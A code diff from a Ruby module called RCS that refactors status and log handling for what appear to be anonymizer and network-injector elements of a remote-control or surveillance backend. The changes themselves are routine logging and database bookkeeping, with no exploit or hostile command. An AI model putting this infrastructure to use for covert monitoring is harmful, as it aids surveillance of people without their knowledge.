@@ -73,7 +73,7 @@ module RCS
         # check that the cookie is valid and belongs to an anon
         element_from_cookie(cookie)
 
-        trace :debug, "Anonymizer '#{@element['name']}' is sending a command..."
+        trace :debug, "Network Element '#{@element['name']}' is sending a command..."
 
         # decrypt the blob
         blob = Base64.decode64(blob)
@@ -143,25 +143,30 @@ module RCS
         if @element['type']
           name = 'RCS::ANON::' + @element['name']
           address = @element['address']
-          trace :info, "[NC] [#{name}] #{address} #{status} #{msg}"
 
           DB.instance.update_status name, address, status, msg, stats, 'anonymizer', version
           DB.instance.update_collector_version(@element['_id'], version)
         else
           name = 'RCS::NI::' + @element['name']
           # we don't have address for the NI, get it from the connection
-          trace :info, "[NC] [#{name}] #{@http[:x_forwarded_for]} #{status} #{msg}"
+          address = @http[:x_forwarded_for]
 
           DB.instance.update_status name, address, status, msg, stats, 'injector', version
           DB.instance.update_injector_version(@element['_id'], version)
         end
+
+        trace :info, "[NC] [#{name}] #{address} #{status} #{msg}"
 
         response << {command: 'STATUS', result: {status: 'OK'}}
       end
 
       def protocol_log(command, response)
         params = command['params']
-        DB.instance.collector_add_log(@element['_id'], params['time'], params['type'], params['desc'])
+        if @element['type']
+          DB.instance.collector_add_log(@element['_id'], params['time'], params['type'], params['desc'])
+        else
+          DB.instance.injector_add_log(@element['_id'], params['time'], params['type'], params['desc'])
+        end
         response << {command: 'LOG', result: {status: 'OK'}}
       end
 
